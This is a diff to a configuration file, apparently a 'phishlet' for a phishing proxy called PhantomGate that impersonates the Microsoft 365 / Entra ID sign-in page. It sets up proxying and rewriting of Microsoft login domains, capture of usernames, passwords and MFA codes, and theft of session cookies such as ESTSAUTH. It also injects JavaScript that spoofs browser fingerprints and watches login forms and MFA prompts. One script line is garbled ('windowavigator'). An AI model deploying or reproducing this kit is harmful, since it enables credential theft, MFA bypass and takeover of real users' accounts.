@@ -1,67 +1,114 @@
-name: "Microsoft 365"
-author: "PhantomGate"
-min_ver: "1.0.0"
+name: Microsoft 365
+author: PhantomGate
+version: 2.0.0
+description: Microsoft 365 / Entra ID authentication - Pixel-perfect replica
 
-proxy_hosts:
-  - phish_sub: "login"
-    orig_sub: "login.microsoftonline.com"
-    domain: "microsoftonline.com"
-    session: true
-    is_ssl: true
-  - phish_sub: "www"
-    orig_sub: "www.office.com"
-    domain: "office.com"
-    session: false
-    is_ssl: true
-  - phish_sub: "aadcdn"
-    orig_sub: "aadcdn.msftauth.net"
-    domain: "msftauth.net"
-    session: false
-    is_ssl: true
+auth:
+  domains:
+    - login.microsoftonline.com
+    - login.live.com
+    - auth.gfx.ms
+    - outlook.office365.com
+    - portal.office.com
+  
+  login:
+    domain: login.microsoftonline.com
+    path: /common/oauth2/v2.0/authorize
+    username:
+      selector: "input[name='loginfmt']"
+      capture: true
+    password:
+      selector: "input[name='passwd']"
+      capture: true
+  
+  mfa:
+    otp:
+      selector: "input[name='otc']"
+      capture: true
+    phone:
+      selector: "input[name='otc']"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: ESTSAUTH
+        regex: ".*"
+      - name: ESTSAUTHPERSISTENT
+        regex: ".*"
+      - name: buid
+        regex: ".*"
+      - name: x-ms-RefreshTokenCredential
+        regex: ".*"
+      - name: ESTSAUTHLIGHT
+        regex: ".*"
+    headers:
+      - name: Set-Cookie
+        regex: "ESTSAUTH=([^;]+)"
 
-sub_filters:
-  - triggers_on: "login.microsoftonline.com"
-    orig_sub: "login"
-    domain: "microsoftonline.com"
-    search: "login.microsoftonline.com"
-    replace: "login.{phish_domain}"
-    mimes: ["text/html", "application/javascript", "application/json"]
-  - triggers_on: "login.microsoftonline.com"
-    orig_sub: "login"
-    domain: "microsoftonline.com"
-    search: "aadcdn.msftauth.net"
-    replace: "aadcdn.{phish_domain}"
-    mimes: ["text/html", "application/javascript"]
-  - triggers_on: "login.microsoftonline.com"
-    orig_sub: "login"
-    domain: "microsoftonline.com"
-    search: "www.office.com"
-    replace: "www.{phish_domain}"
-    mimes: ["text/html", "application/javascript", "application/json"]
+proxy:
+  hosts:
+    - domain: login.microsoftonline.com
+      inject: true
+    - domain: login.live.com
+      inject: true
+    - domain: auth.gfx.ms
+      inject: true
+    - domain: outlook.office365.com
+      inject: true
+    - domain: portal.office.com
+      inject: true
+  
+  sub_filters:
+    - domain: login.microsoftonline.com
+      search: "https://login.microsoftonline.com"
+      replace: "https://{phishing_domain}"
+    - domain: login.live.com
+      search: "https://login.live.com"
+      replace: "https://{phishing_domain}"
+    - domain: outlook.office365.com
+      search: "https://outlook.office365.com"
+      replace: "https://{phishing_domain}"
 
-credentials:
-  username:
-    key: "login"
-    search: '"login"\s*:\s*"([^"]*)"'
-    type: "json"
-  password:
-    key: "passwd"
-    search: '"passwd"\s*:\s*"([^"]*)"'
-    type: "json"
-
-auth_tokens:
-  - domain: ".login.microsoftonline.com"
-    keys:
-      - "ESTSAUTH"
-      - "ESTSAUTHPERSISTENT"
-      - "ESTSAUTHLIGHT"
-  - domain: ".microsoftonline.com"
-    keys:
-      - "SignInStateCookie"
-  - domain: ".office.com"
-    keys:
-      - "OIDCAuthCookie"
-
-landing_path:
-  - "/"
-  - "/common/oauth2/authorize"
+injection:
+  js: |
+    // PhantomGate Injection - Microsoft 365
+    (function() {
+      'use strict';
+      
+      // Override navigator properties for fingerprint evasion
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
+      Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
+      
+      // Remove tracking headers
+      delete windowavigator.sendBeacon;
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        if (form.action && form.action.includes('login')) {
+          var username = form.querySelector('input[name="loginfmt"]');
+          var password = form.querySelector('input[name="passwd"]');
+          if (username && password) {
+            console.log('[PhantomGate] Credentials captured');
+          }
+        }
+      }, true);
+      
+      // Monitor for MFA prompts
+      var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+          if (mutation.addedNodes.length) {
+            var node = mutation.addedNodes[0];
+            if (node.nodeType === 1) {
+              var otc = node.querySelector('input[name="otc"]');
+              if (otc) {
+                console.log('[PhantomGate] MFA prompt detected');
+              }
+            }
+          }
+        });
+      });
+      
+      observer.observe(document.body, {childList: true, subtree: true});
+    })();
